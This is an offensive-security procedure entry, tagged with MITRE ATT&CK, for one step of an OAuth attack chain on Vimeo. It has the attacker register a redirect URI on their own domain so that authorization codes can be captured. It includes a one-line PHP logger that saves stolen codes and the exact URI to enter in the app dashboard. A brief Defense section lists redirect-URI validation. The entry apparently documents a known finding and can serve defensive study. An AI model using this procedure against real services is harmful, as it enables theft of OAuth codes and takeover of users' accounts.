---
id: proc-register-redirect-uri
tags:
  - oauth
  - redirect-uri
  - misconfiguration
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:11.121Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Register-Malicious-Redirect-URI

## Summary

This procedure configures a malicious redirect URI in the Vimeo API app settings, pointing to an attacker-controlled endpoint to capture OAuth authorization codes during the exploit.

## Description

Vimeo's OAuth app configuration lacks strict validation for redirect URIs, allowing attackers to set arbitrary endpoints. By registering a URI under their control (e.g., a PHP script on a personal domain), the attacker prepares to intercept codes redirected from the chained OAuth flow with Facebook.

## Requirements

1. Existing Vimeo API app with client_id
2. Attacker-controlled web server with logging capability (e.g., PHP endpoint)
3. Domain or subdomain for hosting the receiver

## Defense

Defensive measures and detection strategies:

- Validate and whitelist redirect URIs during app registration
- Require domain ownership proof for custom URIs
- Log and alert on redirects to unverified domains

## Objectives

1. Set up endpoint to receive stolen auth codes
2. Bypass Vimeo's lack of URI enforcement
3. Prepare for code exfiltration in the attack chain

## Instructions

### Step 1: Prepare Attacker Endpoint

**Context**: Set up a simple web page or script to log incoming parameters, especially the 'code' query parameter.

Example PHP: Create `code.php` with `<?php file_put_contents('codes.txt', $_GET['code'] . '\n', FILE_APPEND); ?>` on `http://www.prashanthvarma.in/`.

> Ensure the server is accessible and logs queries without errors.

### Step 2: Update App Settings

**Context**: Input the malicious URI into the Vimeo app dashboard.

In the app edit page, set redirect_uri to `http://www.prashanthvarma.in/code.php?code=`, then save changes.

> Confirmation: No error messages; URI is now associated with the app.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[oauth]]
- [[redirect-uri]]
- [[misconfiguration]]
